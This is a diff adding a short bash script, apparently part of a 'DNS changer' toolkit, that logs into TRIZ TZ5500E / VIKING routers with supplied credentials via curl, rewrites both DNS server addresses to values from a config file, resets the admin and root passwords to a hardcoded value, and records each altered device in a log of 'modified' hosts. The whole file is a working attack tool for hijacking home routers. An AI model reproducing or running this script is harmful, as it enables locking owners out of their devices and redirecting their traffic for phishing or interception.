@@ -1,0 +1,36 @@
+#!/bin/bash
+# by bonny
+##########################
+# CONFIG
+source configs/changers.cfg
+PASSWD="eldiablo"
+###########################
+
+dns1F1=`echo $DNS1 | cut -d '.' -f1`
+dns1F2=`echo $DNS1 | cut -d '.' -f2`
+dns1F3=`echo $DNS1 | cut -d '.' -f3`
+dns1F4=`echo $DNS1 | cut -d '.' -f4`
+dns2F1=`echo $DNS2 | cut -d '.' -f1`
+dns2F2=`echo $DNS2 | cut -d '.' -f2`
+dns2F3=`echo $DNS2 | cut -d '.' -f3`
+dns2F4=`echo $DNS2 | cut -d '.' -f4`
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+
+for x in `${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/MainPage?id=24" | grep '/Action?id=58' | sed 's/^.*<a href="//' | sed 's/".*$//'`; do
+	${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}${x}" 1>/dev/null 2>/dev/null
+done
+
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/Action?id=57&dns_server_ip_1=$dns1F1&dns_server_ip_2=$dns1F2&dns_server_ip_3=$dns1F3&dns_server_ip_4=$dns1F4" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/Action?id=57&dns_server_ip_1=$dns2F1&dns_server_ip_2=$dns2F2&dns_server_ip_3=$dns2F3&dns_server_ip_4=$dns2F4" 1>/dev/null 2>/dev/null
+
+for s in `${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/MainPage?id=3" | grep '/Action?id=71' | sed 's/^.*<a href="//' | sed 's/".*$//'`; do
+	$CURL -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}${s}" 1>/dev/null 2>/dev/null
+done
+
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/hag/emweb/PopOutUserModify.htm/FormOne?id=3&user=admin&ex_param1=admin&old_pass=$pass&new_pass1=$PASSWD&new_pass2=$PASSWD" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/hag/emweb/PopOutUserModify.htm/FormOne?id=3&user=root&ex_param1=root&old_pass=$pass&new_pass1=$PASSWD&new_pass2=$PASSWD" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [TRIZ TZ5500E / VIKING]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [TRIZ TZ5500E / VIKING]" >> logs/modificados.log
